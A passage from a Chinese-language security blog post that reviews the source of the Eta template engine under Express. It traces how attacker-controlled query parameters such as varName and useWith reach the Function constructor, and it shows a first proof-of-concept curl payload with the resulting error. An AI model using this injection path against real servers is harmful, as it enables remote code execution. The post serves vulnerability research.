是不應該被控制的，不會有太多防護機制。</p><p>所以我就直接到 <a class="link" href="https://expressjs.com/en/resources/template-engines.html">Express template engines <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 這個官方的頁面去選目標，選到的就是 Eta 。</p><h3 id="Eta-code-review"><a href="#Eta-code-review" class="headerlink" title="Eta code review"></a>Eta code review</h3><p>這邊我使用了 Github Security Lab 所說的<a class="link" href="https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/#technical-summary">常見的場景 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>這個程式只要使用者去訪問 <code>/?favorite=Eta</code>，就會傳回 <code>&lt;h1&gt;My favorite template engine is Eta &lt;br&gt;&lt;/h1&gt;</code>。</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"dependencies"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"eta"</span><span class="punctuation">:</span> <span class="string">"^1.12.3"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"express"</span><span class="punctuation">:</span> <span class="string">"^4.18.1"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> eta = <span class="built_in">require</span>(<span class="string">'eta'</span>)</span><br><span class="line"></span><br><span class="line">app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">"index"</span>, req.<span class="property">query</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">'/app.js'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">'content-type'</span>, <span class="string">'application/js'</span>);</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__filename)</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- views/index.eta --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My favorite template engine is &lt;%= it.favorite %&gt; <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'app.js'</span>&gt;</span>source<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="renderFile"><a href="#renderFile" class="headerlink" title="renderFile"></a><code>renderFile</code></h4><p>我們已經從上面知道 <code>renderFile</code> 是跟 Express 接在一起的接口，所以我們要從這裡開始看。這邊要知道 Express 會放下來這裡的參數是 <code>(filePath, options, callback)</code>，會對應到 <code>renderFile</code> 的 <code>(filename, data, config)</code>，所以 Eta 會先做一些 overload 的處理。</p><p>看到 :29,47 是處理跟 Express 接合的部分，其中 :32 <code>getConfig(data)</code> 回傳的是一些設定值加上 <code>data</code> 的 deep clone，因為 <code>data</code> 可控（從 app.js:11 <code>res.render("index", req.query)</code> 過來的），所以 <code>renderConfig</code> 也可控。</p><p>然後看到 :52 <code>tryHandleCache(data, renderConfig, callback)</code>。記住使用者可控的東西有 <code>data</code> <code>renderConfig</code>，進入 <code>tryHandleCache</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:869</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderFile</span>(<span class="params">filename, data, config, cb</span>) {</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Here we have some function overloading.</span></span><br><span class="line"><span class="comment">    Essentially, the first 2 arguments to renderFile should always be the filename and data</span></span><br><span class="line"><span class="comment">    However, with Express, configuration options will be passed along with the data.</span></span><br><span class="line"><span class="comment">    Thus, Express will call renderFile with (filename, dataAndOptions, cb)</span></span><br><span class="line"><span class="comment">    And we want to also make (filename, data, options, cb) available</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> renderConfig;</span><br><span class="line">    <span class="keyword">var</span> callback;</span><br><span class="line">    data = data || {}; <span class="comment">// If data is undefined, we don't want accessing data.settings to error</span></span><br><span class="line">    <span class="comment">// First, assign our callback function to `callback`</span></span><br><span class="line">    <span class="comment">// We can leave it undefined if neither parameter is a function;</span></span><br><span class="line">    <span class="comment">// Callbacks are optional</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> cb === <span class="string">'function'</span>) {</span><br><span class="line">        <span class="comment">// The 4th argument is the callback</span></span><br><span class="line">        callback = cb;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> config === <span class="string">'function'</span>) {</span><br><span class="line">        <span class="comment">// The 3rd arg is the callback</span></span><br><span class="line">        callback = config;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// If there is a config object passed in explicitly, use it</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> config === <span class="string">'object'</span>) {</span><br><span class="line">        renderConfig = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// Otherwise, get the config from the data object</span></span><br><span class="line">        <span class="comment">// And then grab some config options from data.settings</span></span><br><span class="line">        <span class="comment">// Which is where Express sometimes stores them</span></span><br><span class="line">        renderConfig = <span class="title function_">getConfig</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">settings</span>) {</span><br><span class="line">            <span class="comment">// Pull a few things from known locations</span></span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">settings</span>.<span class="property">views</span>) {</span><br><span class="line">                renderConfig.<span class="property">views</span> = data.<span class="property">settings</span>.<span class="property">views</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">settings</span>[<span class="string">'view cache'</span>]) {</span><br><span class="line">                renderConfig.<span class="property">cache</span> = <span class="literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line">            <span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">            <span class="keyword">var</span> viewOpts = data.<span class="property">settings</span>[<span class="string">'view options'</span>];</span><br><span class="line">            <span class="keyword">if</span> (viewOpts) {</span><br><span class="line">                <span class="title function_">copyProps</span>(renderConfig, viewOpts);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Set the filename option on the template</span></span><br><span class="line">    <span class="comment">// This will first try to resolve the file path (see getPath for details)</span></span><br><span class="line">    renderConfig.<span class="property">filename</span> = <span class="title function_">getPath</span>(filename, renderConfig);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">tryHandleCache</span>(data, renderConfig, callback);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="tryHandleCache"><a href="#tryHandleCache" class="headerlink" title="tryHandleCache"></a><code>tryHandleCache</code></h4><p>看到 :6 會回傳 <code>templateFn</code>，然後 :7 在去執行他。所以 <code>handleCache</code> 會回傳的是一個 function，如果可以把 <code>templateFn</code> 控制成我們想要的形狀，:7 就會去執行到。所以我們跟進 <code>handleCache(options)</code>。記住 <code>options</code> 使用者可控。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:816</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tryHandleCache</span>(<span class="params">data, options, cb</span>) {</span><br><span class="line">    <span class="keyword">if</span> (cb) {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// Note: if there is an error while rendering the template,</span></span><br><span class="line">            <span class="comment">// It will bubble up and be caught here</span></span><br><span class="line">            <span class="keyword">var</span> templateFn = <span class="title function_">handleCache</span>(options);</span><br><span class="line">            <span class="title function_">templateFn</span>(data, options, cb);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (err) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(err);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// No callback, try returning a promise</span></span><br><span class="line"><span class="comment">// 略...</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="handleCache"><a href="#handleCache" class="headerlink" title="handleCache"></a><code>handleCache</code></h4><p>這邊注意 :3 他從 <code>options</code> 裡拿出了 <code>filename</code>，那是 template file 的位置，可能會覺得 filename 可控，但其實不行，因為 Express 會把他蓋掉。</p><p>繼續跟進 <code>loadFile(filename, options)</code>。記住 <code>options</code> 可控。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:795</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleCache</span>(<span class="params">options</span>) {</span><br><span class="line">    <span class="keyword">var</span> filename = options.<span class="property">filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">cache</span>) {</span><br><span class="line">        <span class="keyword">var</span> func = options.<span class="property">templates</span>.<span class="title function_">get</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (func) {</span><br><span class="line">            <span class="keyword">return</span> func;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">loadFile</span>(filename, options);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Caching is disabled, so pass noCache = true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">loadFile</span>(filename, options, <span class="literal">true</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="loadFile"><a href="#loadFile" class="headerlink" title="loadFile"></a><code>loadFile</code></h4><p>看到 :10 的 <code>return compiledTemplate</code>，那就是上面 <code>tryHandleCache</code> 看到會被執行的 <code>templateFn</code>。</p><p>跟進 :6 的 <code>compile</code> 看看我們可以怎麼控制他。記住使用者可控的有 <code>config</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:771</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadFile</span>(<span class="params">filePath, options, noCache</span>) {</span><br><span class="line">    <span class="keyword">var</span> config = <span class="title function_">getConfig</span>(options);</span><br><span class="line">    <span class="keyword">var</span> template = <span class="title function_">readFile</span>(filePath);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">var</span> compiledTemplate = <span class="title function_">compile</span>(template, config);</span><br><span class="line">        <span class="keyword">if</span> (!noCache) {</span><br><span class="line">            config.<span class="property">templates</span>.<span class="title function_">define</span>(config.<span class="property">filename</span>, compiledTemplate);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> compiledTemplate;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Loading file: '</span> + filePath + <span class="string">' failed:\n\n'</span> + e.<span class="property">message</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a><code>compile</code></h4><p>我們知道這個 <code>compile</code> 會回傳的是一個 function，看看他是怎麼造出 function 的。:9 他透過 <code>ctor</code> 來造出 function，<code>ctor</code> 可從 :9 知道他是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 或 <code>getAsyncFunctionConstructor()</code>。 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的用途是把字串變成 function，聽到就覺得危險。</p><p>跟進 :11 <code>compileToString(str, options)</code> 來看看我們可以怎麼去控制這個 function。記住使用者可控的有 <code>options</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:588</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> options = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    <span class="comment">/* ASYNC HANDLING */</span></span><br><span class="line">    <span class="comment">// The below code is modified from mde/ejs. All credit should go to them.</span></span><br><span class="line">    <span class="keyword">var</span> ctor = options.<span class="property">async</span> ? <span class="title function_">getAsyncFunctionConstructor</span>() : <span class="title class_">Function</span>;</span><br><span class="line">    <span class="comment">/* END ASYNC HANDLING */</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">ctor</span>(options.<span class="property">varName</span>, <span class="string">'E'</span>, <span class="comment">// EtaConfig</span></span><br><span class="line">        <span class="string">'cb'</span>, <span class="comment">// optional callback</span></span><br><span class="line">        <span class="title function_">compileToString</span>(str, options)); <span class="comment">// eslint-disable-line no-new-func</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Bad template syntax\n\n'</span> +</span><br><span class="line">                e.<span class="property">message</span> +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title class_">Array</span>(e.<span class="property">message</span>.<span class="property">length</span> + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">'='</span>) +</span><br><span class="line">                <span class="string">'\n'</span> +</span><br><span class="line">                <span class="title function_">compileToString</span>(str, options) +</span><br><span class="line">                <span class="string">'\n'</span> <span class="comment">// This will put an extra newline before the callstack for extra readability</span></span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="compileToString"><a href="#compileToString" class="headerlink" title="compileToString"></a><code>compileToString</code></h4><p>看到這裡，我覺得 <code>compileToString</code> 太危險了。那個會被轉成 function 執行的字串竟然是用字串加法去處理的，那我就隨便找一段可控的字串去植入不就好了？</p><p>來看 :8，<code>config.varName</code> 是我們可控的字串，他只要 <code>config.useWith</code> 為真就會被接上去。來實際操作一次。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:389</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compileToString</span>(<span class="params">str, config</span>) {</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="title function_">parse</span>(str, config);</span><br><span class="line">    <span class="keyword">var</span> res = <span class="string">"var tR='',__l,__lP"</span> +</span><br><span class="line">        (config.<span class="property">include</span> ? <span class="string">',include=E.include.bind(E)'</span> : <span class="string">''</span>) +</span><br><span class="line">        (config.<span class="property">includeFile</span> ? <span class="string">',includeFile=E.includeFile.bind(E)'</span> : <span class="string">''</span>) +</span><br><span class="line">        <span class="string">'\nfunction layout(p,d){__l=p;__lP=d}\n'</span> +</span><br><span class="line">        (config.<span class="property">useWith</span> ? <span class="string">'with('</span> + config.<span class="property">varName</span> + <span class="string">'||{}){'</span> : <span class="string">''</span>) +</span><br><span class="line">        <span class="title function_">compileScope</span>(buffer, config) +</span><br><span class="line">        (config.<span class="property">includeFile</span></span><br><span class="line">            ? <span class="string">'if(__l)tR='</span> +</span><br><span class="line">                (config.<span class="property">async</span> ? <span class="string">'await '</span> : <span class="string">''</span>) +</span><br><span class="line">                (<span class="string">"includeFile(__l,Object.assign("</span> + config.<span class="property">varName</span> + <span class="string">",{body:tR},__lP))\n"</span>)</span><br><span class="line">            : config.<span class="property">include</span></span><br><span class="line">                ? <span class="string">'if(__l)tR='</span> +</span><br><span class="line">                    (config.<span class="property">async</span> ? <span class="string">'await '</span> : <span class="string">''</span>) +</span><br><span class="line">                    (<span class="string">"include(__l,Object.assign("</span> + config.<span class="property">varName</span> + <span class="string">",{body:tR},__lP))\n"</span>)</span><br><span class="line">                : <span class="string">''</span>) +</span><br><span class="line">        <span class="string">'if(cb){cb(null,tR)} return tR'</span> +</span><br><span class="line">        (config.<span class="property">useWith</span> ? <span class="string">'}'</span> : <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">if</span> (config.<span class="property">plugins</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; config.<span class="property">plugins</span>.<span class="property">length</span>; i++) {</span><br><span class="line">            <span class="keyword">var</span> plugin = config.<span class="property">plugins</span>[i];</span><br><span class="line">            <span class="keyword">if</span> (plugin.<span class="property">processFnString</span>) {</span><br><span class="line">                res = plugin.<span class="title function_">processFnString</span>(res, config);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h4><p>把上面所說的東西實作，看看 <code>compileToString</code> 編譯出的 <code>res</code> 會長怎麼樣。</p><p>看到實際用字串加法做出來的字串 <code>res</code> 有我們的 <code>console.log("Ching367436")</code>，而且確定是在會被執行的地方，所以只要等他回傳到 <a href="#tryHandleCache"><code>tryHandleCache:8</code></a> 就會被執行。結果在跑到那之前竟然就噴錯了。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload1</span></span><br><span class="line">curl <span class="string">'http://localhost/?useWith=1&amp;varName=console.log("Ching367436")'</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// res</span></span><br><span class="line"><span class="keyword">var</span> tR = <span class="string">''</span>, __l, __lP, include = E.<span class="property">include</span>.<span class="title function_">bind</span>(E), includeFile = E.<span class="property">includeFile</span>.<span class="title function_">bind</span>(E)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">layout</span>(<span class="params">p, d</span>) { __l = p; __lP = d }</span><br><span class="line"><span class="title function_">with</span> (<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>) || {}) {</span><br><span class="line">    tR += <span class="string">'&lt;h1&gt;My favorite template engine is '</span></span><br><span class="line">    tR += E.<span class="title function_">e</span>(it.<span class="property">favorite</span>)</span><br><span class="line">    tR += <span class="string">' &lt;br&gt;&lt;/h1&gt;\n&lt;a href=\'app.js\'&gt;source&lt;/a&gt;\n'</span></span><br><span class="line">    <span class="keyword">if</span> (__l) tR = <span class="title function_">includeFile</span>(__l, <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>), { <span class="attr">body</span>: tR }, __lP))</span><br><span class="line">    <span class="keyword">if</span> (cb) { <span class="title function_">cb</span>(<span class="literal">null</span>, tR) } <span class="keyword">return</span> tR</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h5 id="Payload1-Error"><a href="#Payload1-Error" class="headerlink" title="Payload1 Error"></a>Payload1 Error</h5><p>看到了錯誤訊息有有三行，:1及 :3 的很明顯的是 Eta 原生的錯誤，:5 感覺不是，上網查了一下發現是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 丟的錯，回想一下剛剛追到的一個地方有 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a>，那就是 <code>compile</code>，所以過去看看。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Eta</span> <span class="title class_">Error</span>: <span class="title class_">Loading</span> <span class="attr">file</span>: views/index.<span class="property">eta</span> <span class="attr">failed</span>:</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bad</span> template syntax</span><br><span class="line"></span><br><span class="line"><span class="title class_">Arg</span> string terminates parameters early</span><br><span class="line">======================================</span><br><span class="line"><span class="keyword">var</span> tR=<span class="string">''</span>,__l,__lP,include=E.<span class="property">include</span>.<span class="title function_">bind</span>(E),includeFile=E.<span class="property">includeFile</span>.<span class="title function_">bind</span>(E)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">layout</span>(<span class="params">p,d</span>){__l=p;__lP=d}</span><br><span class="line"><span class="title function_">with</span>(<span class="params"><span class="variable language_">console</span>.log(<span class="string">"Ching367436"</span>)||{}</span>){tR+=<span class="string">'&lt;h1&gt;My favorite template engine is '</span></span><br><span class="line">tR+=E.<span class="title function_">e</span>(it.<span class="property">favorite</span>)</span><br><span class="line">tR+=<span class="string">' &lt;br&gt;&lt;/h1&gt;\n&lt;a href=\'app.js\'&gt;source&lt;/a&gt;\n'</span></span><br><span class="line"><span class="keyword">if</span>(__l)tR=<span class="title function_">includeFile</span>(__l,<span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Ching367436"</span>),{<span class="attr">body</span>:tR},__lP))</span><br><span class="line"><span class="keyword">if</span>(cb){<span class="title function_">cb</span>(<span class="literal">null</span>,tR)} <span class="keyword">return</span> tR}</span><br><span class="line"></span><br><span class="line">    at <span class="title class_">EtaErr</span> (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">57</span>:<span class="number">15</span>)</span><br><span class="line">    at <span class="title function_">loadFile</span> (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">782</span>:<span class="number">15</span>)</span><br><span class="line">    at <span class="title function_">handleCache</span> (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">805</span>:<span class="number">12</span>)</span><br><span class="line">    at <span class="title function_">tryHandleCache</span> (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">821</span>:<span class="number">30</span>)</span><br><span class="line">    at <span class="title class_">View</span>.<span class="property">renderFile</span> [<span class="keyword">as</span> engine] (node_modules/eta/dist/eta.<span class="property">cjs</span>:<span class="number">919</span>:<span class="number">12</span>)</span><br><span class="line">    at <span class="title class_">View</span>.<span class="property">render</span> (node_modules/express/lib/view.<span class="property">js</span>:<span class="number">135</span>:<span class="number">8</span>)</span><br><span class="line">    at <span class="title function_">tryRender</span> (node_modules/express/lib/application.<span class="property">js</span>:<span class="number">657</span>:<span class="number">10</span>)</span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">render</span> (node_modules/express/lib/application.<span class="property">js</span>:<span class="number">609</span>:<span class="number">3</span>)</span><br><span class="line">    at <span class="title class_">ServerResponse</span>.<span class="property">render</span> (node_modules/express/lib/response.<span class="property">js</span>:<span class="number">1039</span>:<span class="number">7</span>)</span><br><span class="line">    at app.<span class="property">js</span>:<span class="number">12</span>:<span class="number">9</span></span><br></pre></td></tr></table></figure></div><h4 id="compile-revisit"><a href="#compile-revisit" class="headerlink" title="compile revisit"></a><code>compile</code> revisit</h4><p>看到 :9 的 <code>ctor</code> 的地方，第一個參數是 